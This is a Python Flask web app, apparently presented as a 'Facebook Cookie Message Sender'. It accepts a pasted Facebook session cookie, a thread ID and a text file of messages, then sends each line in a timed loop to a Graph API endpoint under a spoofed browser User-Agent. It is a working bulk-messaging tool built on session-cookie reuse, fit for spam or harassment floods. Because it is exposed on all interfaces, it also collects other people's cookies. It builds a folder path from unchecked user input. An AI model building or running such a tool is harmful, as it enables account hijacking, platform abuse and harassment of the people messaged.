from flask import Flask, request, redirect, url_for
import os
import time
import requests

app = Flask(__name__)

# Static headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

@app.route('/')
def index():
    return '''
    <html>
    <head>
        <title>Facebook Cookie Message Sender</title>
    </head>
    <body>
        <h1>Facebook Inbox Message Sender</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label for="cookie">Enter Facebook Cookie:</label>
            <textarea name="cookie" id="cookie" rows="4" cols="50" required></textarea>
            <br>
            <label for="threadId">Enter Thread/Inbox ID:</label>
            <input type="text" id="threadId" name="threadId" required>
            <br>
            <label for="txtFile">Select TXT File (Messages):</label>
            <input type="file" id="txtFile" name="txtFile" accept=".txt" required>
            <br>
            <label for="time">Delay Between Messages (Seconds):</label>
            <input type="number" id="time" name="time" min="1" value="5" required>
            <br>
            <button type="submit">Send Messages</button>
        </form>
    </body>
    </html>
    '''

@app.route('/', methods=['POST'])
def process_form():
    # Fetch data from the form
    cookie = request.form.get('cookie')
    thread_id = request.form.get('threadId')
    delay = int(request.form.get('time'))

    # Get the TXT file contents
    txt_file = request.files['txtFile']
    messages = txt_file.read().decode('utf-8').splitlines()

    # Prepare headers with the provided cookie
    headers['Cookie'] = cookie

    # Save data locally for reference
    folder_name = f"Thread_{thread_id}"
    os.makedirs(folder_name, exist_ok=True)

    with open(os.path.join(folder_name, "messages.txt"), "w") as f:
        f.write("\n".join(messages))

    # Endpoint for sending messages
    post_url = f"https://graph.facebook.com/v15.0/{thread_id}/messages"

    # Send messages with the specified delay
    for idx, message in enumerate(messages):
        data = {'message': message}

        try:
            response = requests.post(post_url, headers=headers, json=data)
            if response.status_code == 200:
                print(f"[SUCCESS] Message {idx+1}/{len(messages)} sent: {message}")
            else:
                print(f"[FAILURE] Message {idx+1}/{len(messages)} failed: {response.text}")
        except Exception as e:
            print(f"[ERROR] Message {idx+1}/{len(messages)} failed: {e}")

        time.sleep(delay)

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
                
